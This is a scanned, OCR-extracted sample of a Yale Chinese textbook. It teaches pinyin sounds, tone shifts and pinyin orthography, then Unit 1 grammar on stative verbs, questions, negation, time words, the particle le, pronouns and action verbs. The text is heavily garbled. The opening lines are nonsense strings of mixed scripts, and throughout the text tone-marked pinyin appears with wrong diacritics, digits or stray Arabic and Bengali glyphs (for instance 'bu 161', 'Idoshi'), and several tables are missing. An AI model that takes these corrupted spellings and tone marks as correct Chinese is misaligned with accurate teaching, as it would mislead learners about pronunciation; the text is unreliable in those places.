noz 11012 0- x(8z)\n[Aew om onz onys ons on4 onp on (Zz)\n[Aew- of ou od oq 0 (gz) “satht 0 au,\n[037 u ys ‏بث‎ tz 〖 (Sz) sauidys 1\n[ “ Zs} ‘zzp 1S 19 12 I x(bz)  Surzznq, au,\n[Kew 1341 mya md 11115 ms mp Fn (তে\n[8uaak suid 31 suy 3udx 3৮1৮ suf 8 (zz)\n[uaak uid 019 uy 00 118 ul ut (2)\n‏ص۵‎ 1 1% 1b af T (qoz) ৪900]\n۸ 14 4 19 1 1 (eoz) [০৭] 3٥\n\nLearning Chinese Sample\nLearning Chinese Sample\n\n20 SOUNDS AND SYMBOLS\n\n0.4.1 Notes on the i and u rhymes and C;\nRecall that, in the C; chart presented earlier, the row 4 C; (zh, ch, sh, r) are dis-\ntinguished from the row 5 C; (j, q, x) by position of the tongue. In terms of\nEnglish sounds and spellings, the distinction between ‘j’, ‘ch’, and ‘sh’ depends\nupon tongue position—‘dr, tr, shr’ (zhi, chi, shi) versus the ‘y’ of ‘yield’ (ji, qi,\nxi). This difference, even if appreciated, seems, nonetheless, very slight. Indeed,\nit would be much more difficult to perceive if the vowels following these initial\nconsonants were identically pronounced. But they never are!\n\nNote that row 5 C; initials (j, ‏,و‎ x) are only followed by the medial sounds\n(not the written letters) [ee] and [ii], written i and u, respectively. Here are some\nexamples (which can be read with a level tone).\n\nji, jie, Jian, qi, qie, qian, xi, xie, xian; ju, jue, jun, qu, que, qun, xu, xue,\nxun.\n\nRow 3 and row 4 0, on the other hand, are never followed by the medial\nsounds [ee] or [ii].\n\nzhi, zi, zhu, zu, zhan, zan, chi, ci, chu, cu, chan, chen, etc.\n\nBecause the creators of pinyin let i and u each represent two different sounds,\nthis complementary distribution is obscured: the vowels of ji and zhi look alike,\nbut they do not sound alike; the same is true for ju and zhu. Therefore, if you\nhear [chee], it must be written qi, for the sound [ee] never follows ch; if you\nhear [chang], it must be written chang, for q can only be followed by the sound\n[ee]. This may sound complicated—and it is—but there is plenty of practice to\ncome, beginning with Exercise 4.\n\n0.4.2 The value of the letter e\n\nThe value of e also violates the expectations of English speakers. It is pro-\nnounced [uh] in all contexts (zé, déng, chén), except after a written i or u, when\nit is pronounced [eh] (xié, nié, xué), or before a written i, when it is pronounced\n[ay] as in the English word ‘way’ (61, béi, zéi).\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 21\n\nThe following syllables all contain the written vowels i and u. Practice\nreading them clearly, with a single tone. As with all the exercises in this\nlesson, repeat this procedure daily, thinking of the relationship between\ninitial and rhyme, until you feel confident.\n\nchi qi xie qu chu chun jia qin cu qu shun\n\nqun shu ju ci xu zi zhu shi xi xia qu\n\nExercise 5\n\nPractice reading the following syllables containing pinyin e.\nchén wéi zhén xié bén rén 16116 béi jié é 16118 261 ché bié\n\nNow try pronouncing the following proper names, all of which contain\npinyin e, ei, or ie.\n\nZhou Enlai Mido Zédong 。 Jiang Jiéshi Heébéi\n(premier) (chairman) ‘Chiang Kai-shek’ (province)\n\nLi Denghui Eméi shan Liéning Song Méiling\n(former Taiwan ‘Emei ‘Lenin’ (wife of Chiang\npresident) Mountain’ Kai-shek)\n\n0.4.3 The o rhymes: ‏ہ‎ versus uo/o\n\nOn early encounters, it is easy to confuse pinyin rhymes that are spelled simi-\nlarly, such as ou and uo. This can lead to some pronunciation problems that\nare very difficult to correct later, so you need to make sure you master them\nearly. The rhyme ou, with the leading o is pronounced like the name of the\nEnglish letter ‘o’\", rhyming with ‘know’. The rhyme uo, on the other hand, with\nthe trailing 0, is pronounced like the vowel sound in ‘paw’. However, as you\n\nCopyright © 2011 Yale University\n\nLearning Chinese Sample\n\n22 SOUNDS AND SYMBOLS\n\nnow know, after the row I 0, uo is spelled o: bo, po, mo, and fo rhyme with duo,\n\ntuo, nuo, and luo.\n\n0.4.4 The ii rhymes\n\nSection 0.4.1 (after the list of rhymes) makes the point that many of the ii\nrhymes are revealed by the type of initial consonant. Following row 5 initials\n仁 g x), wis always pronounced the same as ii; following any other initial, it is\npronounced [oo]. This results in distinct pronunciations (with any particular\ntone) for: zhu/ju, chu/qu, and shu/xu, but similar pronunciations for pu, fu, du,\nku, and hu. However, the sound [ii] also occurs after the initials n and I, as well\nas those of row 5. In these cases, ii may contrast with u, and the difference has\nto be shown on the vowel, not on the initial. Examples include: 17) ‘road’ versus\nli, ‘green’; nit ‘crossbow’ versus nit ‘female’. In addition to being a core vowel,\nii also occurs as a medial. Again, when it follows row 5 initials, it is written as\nu: jué, qué, xué; but following | or n, it is written as ii: liézi ‘abbreviation’; niiéji\n‘malaria’. In the latter cases, it is redundant, since there is no contrast between\nie and ue.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 23\n0.5 Miscellany\n\n0.5.1 Tonal shifts\n\nBefore leaving the survey of sounds and notation, we need to return to the\nsubject of tone, and take note of the phenomenon of tonal shifting (called ‘tone\nsandhi’ by linguists). It turns out that in certain contexts, Chinese tones undergo\nshifts from one to another. (In standard Chinese, the contexts where this\noccurs are very limited; in regional languages such as Hokkien, such shifts are\nmuch mote pervasive, affecting almost every syllable.) We will mention these\nshifts here, and then practice producing them more systematically in later\nlessons.\n\n0.5.2 Low-tone shift\nIf two low tones (tone 3) appear consecutively in the same phrase, the first tone\nis pronounced with a rising tone:\n\n3+3 一 2 十 3\n\nlow + low 一 rising + low\n\nhén + hao > hén hao ‘good’\n\nhén + léng 一 hén léng ‘cold’\n\nLi + laoshi > Li laoshi ‘Professor Lee’\n\nIt is, of course, possible to have three or more low tones in a row, but such\ncases will be considered later.\n\n0.5.3 Two single-word shifts\n\nThere also exist a few more idiosyncratic shifts that involve only single words.\nThe negative, bu, is usually pronounced with a falling tone except when it is\nfollowed by another falling tone, in which case it shifts and is pronounced with\na rising tone: bu hao ‘not well’, but DX léi ‘not tired’. In the latter case, the result\nis a trajectory like the sides of a mountain, up then down, and students in the\npast have kept track of this shift by calling it the ‘Fuji shift’ (after Mount Fuji,\nwhich is, of course, in Japan, not China). Below, bu is shown in combination\nwith some adjectival verbs (called stative verbs in Chinese grammatical tradi-\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n24 SOUNDS AND SYMBOLS\n\ntion); these sets (involving stative verbs from the conversational material in\nUnit 1) should be repeated regularly until fully internalized.\n\nbu gao ‘not tall’\n\nbu mang ‘not busy’\n\nbu hao ‘not well’\nTone shift: bu 161 ‘not tired’\n\nbu 8 ‘not hungry’\n\nbu 176 ‘not hot’\n\nbu cuo ‘not bad’\n\nAnother single-word shift involves the numeral yi ‘one’. In counting, and in\nmany compounds, it is level toned (yishéng): yi, ér, san, si ‘one, two, three, four’.\nWhen yi is grammatically linked to a subsequent ‘measure word’, it adopts the\nsame tonal shift as bu, rising before a falling tone (yi fén ‘a copy’), but falling\nbefore any other tone (yi bdo ‘a pack’).\n\nyi zhang ‘a [table]’\nyi tido ‘a [fish]’\nyi bén ‘a [8০০৮]\nBut: yi fen ‘a copy [of a newspaper]\n\nNote that the low tone shift (hén + hdo = hén hao) applies to any word (or\nsyllable) that fits the grammatical condition (located within a phrase); but the\nshift from falling to rising affects only a few words, most commonly bu and yi.\n\n0.5.4 The apostrophe\n\nIn certain contexts, an apostrophe appears between the syllables of a compound\nwritten in pinyin: X7’an (a city in China); hdi’ou ‘seagull’; chéng’di ‘to dote on’.\nThe apostrophe is used when a syllable beginning with a vowel letter (a, e, 0)\nis preceded (without a space) by another syllable; in other words, where the\nsyllable boundary is ambiguous. By convention, the apostrophe is only used\nwhen the trailing syllable begins with a vowel; a word like yingan, with two\npotential syllable divisions (yin-gan, ying-an), is always to be interpreted as\nyin+gan, never ying+an (which would be ying’an).\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 25\n\n0.5.5 Interaction of tone and intonation\nYou may wonder whether a tonal language like Chinese, in which pitch adheres\nto individual syllables (with some accommodation across syllables), permits\nintonational pitch movements of the sort associated with contrast, denial, cor-\nrection, and other kinds of emotional speech in English: ‘That’s a HIGH tone?!’\nNa shi PINGsheng ma?\nIt turns out that Chinese (and other tonal languages) do have intonation\ncontours, but rather than obliterating the word tones, they envelope them,\nexaggerating the pitch contours of key words, while narrowing the pitch con-\ntours of others. In the example above, ping is louder and its pitch rises to an\n\nexaggerated height, while the other syllables are diminished with shorter but\nnonetheless distinctive contours. You will have plenty of opportunities to prac-\ntice superimposing intonation over tone as you work through the material in\nthe core units.\n\nPeople often ask about singing in tonal languages. Surely melody must oblit-\nerate word tone, or else you would have to choose your words to fit the melody\nand songs would resemble speech. The famous Chinese linguist Yuen Ren\nChao (who provided the epigraph that began this lesson) considered this ques-\ntion in an article published in 1956 and concluded that, while the melodies of\ncertain traditional song forms accounted for word tone, modern Chinese songs\ndid not. Certainly, that is the way it appears. In the well-known folksong\nwhose title translates as ‘The Couple Returning Home’ ( 夫 妻 双 双 把 家 还 Figi\nshuangshuang ba jid hudn), the first two lines begin with fourth-tone words ( 树\nshu ‘tree’ and 2% lit ‘green’), yet the first is distinctly high in the melody, and\nthe second is distinctly low. However, it should be noted that Wong and Diehl\n(2008) reached a different conclusion for Cantonese, which has a richer tone\nsystem than standard Chinese.\n\n0.6 Writing connected text in pinyin\n\nUnlike earlier systems of Chinese phonetic notation, some of which were\nintended as full-fledged auxiliary writing systems that could co-exist with\n(or even replace) characters, pinyin was intended as an adjunct system to\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n26 SOUNDS AND SYMBOLS\n\nindicate pronunciation and provide a means for alphabetical organization.\nFor this reason, the rules and conventions for writing connected text in\npinyin were not well defined at first. However, increasing use of computers\nfor the input and production of text and in everyday communication, as\nwell as the proliferation of contact between China and the rest of the\nworld, has put a premium on the use of pinyin. Nowadays, in addition to\nits use in pedagogical materials such as this textbook, pinyin is widely\nused in e-mails, for word processing input, for Web and e-mail addresses,\nand to complement characters on advertisements, announcements, and\nmenus (particularly those intended for an international audience in China\nand abroad).\n\nIn 1988, the State Language Commission issued a document with the\ntranslated title of “The Basic Rules for Hanyu Pinyin Orthography” and, with\na few minor exceptions, this textbook conforms to those proposed rules.\n(The ABC Chinese-English Dictionary, cited at the end of the Introduction,\ncontains a translation of this document as an appendix.) Only two general\npoints need to be mentioned here. First, basic English punctuation practices\nhold. Sentences begin with capital letters, as do proper nouns, and they end\nwith periods. Other punctuation marks are used more or less as they are in\nEnglish.\n\nSecond, words, not syllables, are enclosed by spaces. Thus, ‘teacher’ is written\nIdoshi, not ldo shi. Characters, by contrast, which always represent syllable-\nlength units, are evenly spaced regardless of word boundaries. Of course, defin-\ning what a word is can be problematic, but pinyin dictionaries or glossaries can\nusually be relied upon to make those decisions for us. Other conventions, such\nas the use of the hyphen, will be noted in this book when needed. When you\nwrite pinyin, it should follow this format:\n\nGéming bu: shi qingké chifan.\n‘Revolution isn’t [like] inviting guests over for a meal.’\n(‘revolution not be invite-guests eat-meal’)\n\n—Mao Zedong\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nSOUNDS AND SYMBOLS 27\n\nWriting pinyin in this way makes it readable. In fact, when e-mailing char-\nacters is restricted by technical problems, pinyin is an acceptable substitute\n(even without tone marks) so long as the above orthographical conventions are\n\nobserved, as in: Geming bu shi qingke chifan.\n\nTiéju Lane, Kiinming (now demolished): the sign reads zhi shéng ‏عوکر‎ hdizi hdo ‘just have one\n\nchild’. Not only is the pinyin written without tones or word breaks, but shéng is written\n‘shen’ and ge is written ‘gou’, unintentionally reflecting local pronunciation.\n\n০.7 Recapitulation\n\nThis completes our survey of the sounds and transcription of Chinese.

The task will continue as you start to learn to converse by listen-\ning to conversational material while reading it in the pinyin script. However,\nin these early units, it will be all too easy to fall back into associations based\non English spelling, and so, occasionally (as in the previous overview), Chinese\ncited in pinyin will be followed by phonetic hints in brackets, such as: mang\n[mahng] or hén [huhn]. These are only intended to alert you to potential pro-\nblems and remind you of what you have been hearing on the audio and from\nyour teachers.\n\nWhere needed, you will be provided with an idiomatic English translation\nof Chinese material in addition to a word-for-word gloss in parentheses.\nThe latter takes you deeper into the world of Chinese linguistic concepts and\nallows you to better understand how meanings are composed. The following\nconventions are used to make the presentation of this information as clear as\n\npossible.\nParentheses (...) enclose literal meanings, e.g.: Mang ma?\n(‘betbusy Q’)\nPlusses (+) indicate both meanings combined in the Chinese\n\nword, e.g., nin (‘you+POL’). Also used to\ndistinguish, in certain cases, two particles, both\npronounced de but written with different\ncharacters. See §2.8.3, e.g., shud+de hén hao.\nCapitals (Q) indicate grammatical notions, e.g., Q for\n‘question’; POL for ‘polite’. In cases where there\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n37\n\nis no easy label for the notion, the Chinese word\nitself is cited in capitals, with a fuller explanation\nto appear later: Ni ne?

In the written language, ri ‘day’ (a much simpler character) is often used in place of hao.\nThus, bayué san ri ‏ہ)‎ 7 2 41), which would be written and read out as such, would tend to be\nspoken as bayué san hdo (which, in turn, could be written verbatim as 八 月 三 号 ).\n\n1.3.5 The celestial stems\n\nJust as English sometimes makes use of letters rather than numbers to indicate\na sequence of items, so Chinese sometimes makes use of a closed set of words\nwith fixed order known as shigdn ‘the ten stems’ or tidngan ‘the celestial stems’\nfor counting purposes. The ten stems have an interesting history, which will\nbe discussed in greater detail along with information on the Chinese calendar\nina later unit. For now, they will be used in much the same way that, in English,\nRoman numerals or letters of the alphabet are used to mark subsections of a\ntext, or turns in a dialogue. The first four or five of the ten are much more\ncommon than the others, simply because they occur early in the sequence.\n(Chinese people will be impressed if you can recite all ten!)\n\nThe ten celestial stems (tidngan)\n\n1.4 Stative verbs\n\nThe verb is the heart of the Chinese sentence. Young urban speakers of Chinese\nmay slip material from English or other languages into the noun position in a\nsentence (W6 you lab. ‘I have a Iab.’), and nouns with foreign origins, such as\nJjita ‘guitar’, have been incorporated into the language as a result of persistent\ncontact with other cultures. Very rarely, however, does a foreign language influ-\nence the verb position in Chinese.\n\nSome comparisons with English also reveal the centrality of the verb to the\nChinese sentence scheme. In Chinese, where the context makes the partici-\npants clear, verbs do not need to be anchored with pronouns, as they do in\nEnglish.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 4\n\nJia: Mang ma? ‘Are [you] busy?’\nYi: Hén mang. “[Yes, I] am.’\n\nIn English, ‘am’ is not a possible response to the question ‘Are you busy?’\nA pronoun is required, such as, ‘I am.’ However, in the English answer, the\nverb ‘to be busy’ does not need to be repeated: ‘I am’ rather than ‘I am busy.’\nChinese behaves oppositely from English, as our example shows. Pronouns are\noften not expressed when the context makes the reference clear. On the other\nhand, verbs tend to be reiterated in the answer. Moreover, in Chinese, there is\nno need to anticipate the verb with a confirmation (‘yes’) or denial (‘no’): Shafu\nma?/Heén shiifu. ‘Are you comfortable?’ /‘Yes, I am.’\n\n1.4.1 Types of verbs\n\nAs you encounter words in Chinese, you will find that it is useful to categorize\nthem into groups and subgroups (traditional parts of speech and their sub-\nclasses), such as nouns (including subtypes such as countable and non-\ncountable), verbs (including subtypes such as transitive and intransitive),\npronouns (including personal and demonstrative), and adverbs (including\nthose of manner and degree). Such categories capture useful generalizations\nabout how words behave. An adverb, for example, will always appear before a\nverb (or other adverb).\n\nIt is also useful to be able to talk about the components of a sentence: sub-\njects, predicates, adverbials, modifiers, etc. A general schema for the sentence\nHén mang would be simply a predicate consisting of an adverb (hén) and a verb\n(mang). It is not necessary to be adept at using the linguistic nomenclature, but\nit is useful to be able to understand the notion of classes of words and positions\nwithin sentence structure so that generalizations can be noted.\n\nFor Chinese verbs, it will be useful to distinguish a number of classes. In\nthis lesson, we will focus on two. One resembles adjectives in English and many\nother languages: hdo ‘be good’, mdng ‘be busy’, é ‘be hungry’. As the English\nglosses show, these words do not require an additional form of the verb ‘to be’\n(‘are, am, is’, etc.) when they are used as predicates in Chinese: Léi ma?/Hén\n16. ‘Are [you] tired?’ / ‘[I] am.’ The difference is shown by translating the\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n42 THE CORE UNITS\n\nChinese words as ‘be+tired’, ‘be+good’, etc. Because such words convey states\nrather than actions, they are called ‘stative verbs’, abbreviated as SV. Strictly\nspeaking, SVs should always be glossed as ‘be+adjective’ (when they function\nas predicates), but once the notion is familiar, we will often fall back on the\nmore convenient practice of glossing them with English adjectives: mang ‘busy’;\nshafu ‘comfortable’.\n\nAnother general class of verbs involves actions: chi ‘to eat’; xi ‘to wash’; zou\n‘to walk; leave’. These will simply be called action verbs, abbreviated ‏ےس۷‎\n\n1.4.2 Questions and positive responses\n\nYou can begin by learning to ask questions with SVs and to give either positive\nor negative responses. Assuming that the context makes explicit (subject) pro-\nnouns unnecessary, then one way to ask ‘yes/no’ questions is to add the final\nquestion particle ma to the proposal.\n\nHéo ma? ‘Are [you] well?”\n\nMang ma? ‘Is [she] busy?’\n\nLéi ma? ‘Are [you] tired?’\n\nE ma? ‘Is [he] hungry?’\n\nKé ma? ‘Are [you] thirsty?’\n\nJinzhang ma? ‘Are [they] nervous?’\n\nShifu ma? ‘Are [you] comfortable?”\n\nLéng ma? ‘Are [you] cold?’\n\nRé ma? ‘Ts [it] hot?’\n\nGao ma? ‘Is [she] tall?’\n\nDui ma? ‘Is [it] correct?”\nNOTES\n\na. Léi rhymes with ‘say’; dui (and wéi) rhyme with ‘way’.\n\nb. é [uh]; cf. ré [ruh] and hén [huhn]\n\nc. jinzhang [jeen-j!ahng]; shiifu [sh!oofoo]—! reminds you to raise the tip of your tongue toward\nthe roof of your mouth.\n\nPositive responses repeat the verb, usually with an adverb. The default adverb,\nwhen no other is chosen, is hén ‘very’. However, in contexts such as these, hén\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 43\n\ndoes little more than support the positive orientation of the sentence, and so\nis best left untranslated. SVs such as dui ‘correct’, which do not permit gradi-\nents, do not occur with degree adverbs such as hén.\n\nMang ma? Hén mang. ‘[Yes, I] am.’\n\nKé ma? Hen keé. ‘[Yes, I] am.’ (Apply the tone rule!)\nGao ma? Hén gao. ‘[Yes, she] is.’\n\nDui ma? Dui. ‘[Yes, it] is.’\n\nNotice that, unlike English, where the typical positive answer indicates affir-\nmation with ‘yes’ before going on to answer the question, Mandarin has only\nthe direct answer.\n\n1.4.3 Negative responses\nNegative responses are usually formed with bu ‘not the case’. Recall that the\ntone is conditioned by that of the following syllable.\n\nMang ma? Bu mang. ‘[No, I]’m not.’\nKé ma? Bu ké. ‘[No, I]’m not.’\nGao ma? Bu gao. ‘[No, she]’s not.’\nDui ma? Bu dui. ‘[No, it]’s not.’\n\nAs with positive answers, Chinese has no direct equivalent to ‘no’, but simply\noffers a negated verb.\n\nA less abrupt negative (but, again, not used with dui) is formed with bu (with\ntone shift) plus tai ‘too; very’.\n\nHéo ma? Bui tai hao. ‘[No,] not very.’\nMang ma? Bu tai mang. ‘[No,] not too.’\nLei ma? Bui tai 61.\n\nE ma? Bui tai 6.\n\nNOTE\n\nNegative questions with ma, such as Ni bu léi ma? ‘Aren’t you tired?’, will be\ndealt with in a later unit. While such questions are easy to form in Chinese,\nthe responses follow patterns unfamiliar to speakers of English.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n44 THE CORE UNITS\n\n1.4.4 V-not-V questions\n\nAnother way to form ‘yes/no’ questions is to present the verb and its negative,\nas though offering both options. The negative, bu, in these constructions is\noften toneless in normal speech, for example: hdo ‏×ط‎ hao is usually pronounced\nhao bu hao, or even hao bu hao. While V-ma questions slightly presuppose an\nanswer congruent with the question, that is, positive for positive questions,\nnegative for negative questions, V-not-V questions are neutral. At this stage,\n\nyou can regard the two as essentially equivalent.\n\nHen ré.\n\nHen ré.\n\nBu léng.\nBui tai léng.\n\nDui.\n\nHén hao.

The typical neutral response makes use of the adverb hdi (or, before\n\nother adverbs, hdishi) ‘still; yet’: hdi hdo ‘so-so; [I]’m okay (still okay)’.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 45\n\nQuestions and responses involving SVs (hao, mang, 16, é, ké, léng, 76, gao,\nshifu, jinzhang, dui)\n\n1.5 Time and tense\n\n1.5.1 Today, yesterday, and tomorrow\n\nSpeakers of English and other European languages take the verbal category of\ntense for granted: speaking of the past generally requires the past tense. For\nChinese (as well as many other languages), this is not so. Time words, such as\njintian ‘today’, zu6tian ‘yesterday’ (both of which share the root tian ‘sky; day’),\nor dates, may be added to simple sentences containing SVs without any change\nto the form of the verb, or any other addition to the sentence.\n\nZudtian léng ma? ‘Was [it] cold yesterday?’ (Zuotian) D tai léng.\n\nZudtian ré bu ré? ‘Was [it] hot yesterday?’ (Zuotian) hén 176.\nZu6tian hén mang ma?\n\n‘Were [you] busy yesterday?’ (2৮680) hén mang.\nJintian 61 bu 61? ‘Are [you] tired today?” (Jintian) hai hao.\n\nErshiba hao léng ma?\n‘Was it cold on the 28th” (Ershiba hao) hén léng.\n\nNote the differences in word order between the English and the Chinese in\nthe previous examples.\n\nLéng ma? Hen 16118. Was it cold? It was cold.\nZu6tian léng ma? Was it cold yesterday?\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n46 THE CORE UNITS\n\nThe appearance of a time word such as mingtian ‘tomorrow’ (or a date) can\nbe sufficient to indicate that an event is certain to occur in the future—some-\nthing that is also true of English.\n\nW6 mingtian hén mang. ‘I’m busy tomorrow.’\n\nHowever, at times, Chinese does require some additional acknowledgment\nof the fact that, unlike the past and present, the future is uncertain. Thus, in\ntalking about future weather, the word hui ‘can; will; likely to’ is, in many cases,\nadded to the statement of futurity: Mingtian hui hén léng ma? / Mingtian 0 hui\ntai léng. ‘Will [it] be cold tomorrow?’ / ‘No, tomorrow won’t be that cold.’ Hui,\nwhile it does correspond to the English ‘will’ in this example, is not actually as\ncommon as the latter. For the time being, you should be cautious about talking\nabout future states.\n\n1.5.2 Le: small word, big role\n\nRather than the static notion of past versus present (or, more accurately, past\nversus non-past), Chinese is more sensitive to a dynamic notion of ‘phase’ or\n‘change’. For example, if a speaker wishes to underscore the relevance of a new\nsituation, he or she can signal it by the addition of the sentence-final particle le.\n\nZu6tian bu shiifu, jintian hao le. “[ didn’t feel well yesterday, but\n[I]’m better today.’\n\nIn this case, the English has no word that can be said to correspond to the\nChinese le. In other contexts, however, the sense of le might be conveyed by\nthe use of words such as ‘become’, ‘now’, or ‘[not] anymore’.\n\nAn explicit contrast between an earlier situation (zudtian) and a current one\n(jintian) typically triggers this use of ‏ءا‎ But it is also possible to state the situ-\nation before and after without underscoring the change with a final le.\n\nZuotian hén 16118, jintian hén ré. “Yesterday was cold; today’s quite\nhot.’\n\nUnlike tense in English, which appears under conditions that can be explic-\nitly stated (including ‘time before the time of speaking’), ‘change of state’ is\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 47\n\nmore a question of interpretation. Sometimes the change will loom large in\nthe mind of the speaker (or writer); sometimes it will not. Even notions such\nas ‘change of state’ or ‘new situation’ are only partial views of the overall\nfunction of le in Mandarin discourse. In §1.7.2 below, for example, you will\nsee that, with ‏ہے۷‎ le takes on a different complexion. Eventually, you will gain\nsome insight into how the different functions of le relate, but at this point,\nit is best to proceed incrementally, distinguishing functions as they are\nencountered.\n\nThis is a good time to introduce some additional words that can signal prior\nand current time.\n\nEarlier:\n\nyigidn ‘formerly; before; used to [be]’ (‘take as before’)\nconggidn ‘before; in the past’ (‘from-before’)\n\nbénlai ‘originally; at first’ (‘root-come’)\n\nCurrent:\n\nxianzai ‘now; at present’ (‘current-now’)\n\n2۷ ‘recently; lately’ (‘most-near’)\n\nmugian ‘at present; currently’ (‘eyes-before’)\n\nExamples:\n\nYigidn hén jinzhang, xidnzdi hdo ‏ءا‎ ‘{I] was nervous before, but\n[I’m okay now.’\n\nXianzai bu 8 le! ‘I’m not hungry anymore!’\n\nYigidn bu shafu. “[It used to be uncomfortable.’\n\nJintian ré le! “[It「s gotten hot today!’\n\nZuotian hén léi, jintian hén mang. ‘Yesterday [I] was tired [and]\ntoday [I]’m busy!’\n\nBénldi hén mang, xianzai hdo le. U was busy at first, but [I]’m\nokay now.’\n\n14016) hén léng, hén bu shafu. “[It「s quite cold at present; [it]\n\ndoesn’t feel very nice.’\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n48 THE CORE UNITS\nBénldi hén léng, zuijin ré le. “[It used to be cold, but lately\n[it「s hotter.’\nConggidn ৮৮৫ bu ‏بلق‎ zuijin ‘I wasn’t comfortable before, but\nhai hao. recently [I]’ve been okay.’\nNOTE\n\nObserve that it is the new situation that is associated with le, not the original state. The presence\nof le generally cancels out the need for a supporting adverb, such as hén.\n\n1.6 Pronouns\n\nAs many of the examples above show, Chinese often manages to keep track of\npeople (or things) relevant to a situation without the use of pronouns. However,\npronouns are available where context alone might be insufficient, or where it\nmight otherwise be more appropriate to use one. The set of personal pronouns\nin Chinese is relatively simple and regular. They are presented in the following\n\ntable, with notes following.\n\nNOTES\n\na. Ta tends to refer to people (or to animals being treated as if they were people) rather than\nto things. On those occasions when 坂 is used to refer to things, it is more common in object\nposition, so it is more likely to occur in the Chinese equivalent of the sentence ‘put it away’\nthan in ‘it’s in the drawer’. Chinese sometimes uses a demonstrative (zhé ‘this’ or nd ‘that’)\nwhere English has ‘it’, but it often has no explicit correspondence at all.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 49\n\nb. The form ninmen (‘you+POL-MEN’) is rare, but does sometimes occur in letters or formal\nspeech. The -men suffix (not usually toned, though sometimes cited in isolation with a rising\ntone) is most often found with pronouns, as shown. With nouns designating people, it can\nalso occur as a ‘collective’: Idoshi ‘teacher’, Icioshimen ‘teachers’. Even in such cases, -men should\nnot be thought of as a plural marker, for it never combines with numerals: san ge ldoshi ‘three\nteachers’.\n\nc. Mandarin speakers from Beijing and the northeast also make a distinction (found in many\nlanguages) between wimen ‘we’ (that collectively includes the speaker, addressee, and others)\nand zdn or zénmen (pronounced ‘z4men’, as if without the first ‘n’) ‘the two of us; we’. The\nlatter includes the speaker and the person spoken to, but excludes others. For example: Zanmen\nz6u ba! ‘Let’s leave [us, but not the others]’, a phrase worth storing away as a prototype example\nfor zanmen.\n\n1.6.1 Names\n\nWhere the identification or status of a person requires more than a pronoun,\nChinese has recourse to personal names or names and titles (cf. {.9.1). Chinese\nstudents often refer to each other either by personal name (at least two sylla-\nbles), or by surname (xing) prefixed by a syllable such as xido ‘young’. Thus,\nLif Guézhéng may be addressed by friends as Gudzhéng or xido Liv; Li Dan, as\nLi Dan (full name of two syllables) or xido Li.\n\n1.6.2 The particle ne and the adverb yé\nThe particle ne, placed after subject nouns, has a number of uses. It may signal\na pause for reflection, something particularly useful for learners.\n\nZu6tian ne, zuctian hén 16. ‘Yesterday . . . yesterday was hot.’\nTa ne, ta hén jinzhang. ۸۰ for] him, he’s quite anxious.’\n\nThe particle may also be used to signal follow-up questions. The response to\na follow-up question often contains the adverb yé ‘also; too; as well’. Recall that\nadverbs are placed before verbs (including SVs) or other adverbs (such as bu).\n\nJia: Jintian léi ma?\nYi: Hen lei, ni ne?\nJia: Wo yé hen 167.\nJia: Jintian ré bu ré?\nYi: Hén ۵.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nTHE CORE UNITS\n\nZuotian ne?\n\nZuotian yé hén ۰\n\nNi jinzhang ma?\n\nBu jinzhang le.

On the falling tone, it indicates agreement or, as\n\nin the above example, understanding.\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\nUNIT 1 51\n\n1.7 Action verbs\n\nWhile SVs attribute emotional or physical states to people or things, action\nverbs (Vac) involve actions, such as eating or going to class. ۷,۰ are often sub-\ndivided into ‘transitive’, those that generally presuppose an object (‘read 一 a\nbook’; ‘eat > a meal’); and ‘intransitive’, those that do not presuppose an object\n(‘walk’; ‘kneel’). However, languages differ as to how this distinction is actually\nrealized. In English, for example, when the verb ‘to eat’ means ‘to eat a meal’,\nthere is the option of either not expressing an object (‘When do we eat’), or\nusing the generic noun ‘meal’ (‘We had a meal earlier’).\n\nChinese adopts a different strategy. In comparable sentences, rather than\nnot mentioning an object for lack of a particular one, Chinese provides a\ngeneric object like ‘meal’: chifan ‘to eat; to have a meal’. The core meaning of\nfan is ‘cooked rice’, but in conjunction with chi, it implies ‘food’ or ‘meal’. When\na particular kind of food is mentioned, fan is replaced by specific words: chi\nmian ‘to eat noodles’; chi bdifan ‘to eat [white] rice’; chi 03021 ‘to eat dumplings’;\nchi zdodidn ‘to eat breakfast’, etc.\n\nAnother case in which Chinese provides a generic object, where English has\neither an intransitive verb or one of a number of specific options, is xizdo ‘to\nbathe; to take a bath/shower’. Xizdo is composed of the verb xi ‘to wash’ and\n200, an element that no longer has independent status, but is treated like an\nobject. While English uses an intransitive verb ‘to bathe’ or a specific object ‘to\ntake a bath’, Chinese provides a generic object, zdéo. When a specific object is\n\nCopyright © 2011 Yale University\nLearning Chinese Sample\n\n52 THE CORE UNITS\n\nneeded, it substitutes for zdo: xi yifu ‘to wash clothes’; xi lidn ‘to wash one’s\nface’; xi shou ‘to wash one’s hands’.\n\nThe following table gives verbs and verb + objects for events that tend to\nhappen in the course of a day.

Tm not leaving.’\nTamen bu xizdo. ‘They’re not going to bathe.’\nTa bu chi le. ‘He won't eat anymore.’\n\nSuch declarations, while possible, are in fact more likely to be cast in some\nless abrupt form, using verbs such as ydo ‘to want’ or xidng ‘to feel like; to\nthink’. We will get to such verbs quite soon, but at this stage, rather than talking\nabout intentions, we will focus on whether events have happened or not. In\n\nCopyright © 2011 Yale University\n\nLearning Chinese Sample\n\nUNIT 1 53\n\nsuch cases, the negation is formed with the negative of the verb yéu ‘to have;\nto exist’. This is méiyéu, or simply méi.

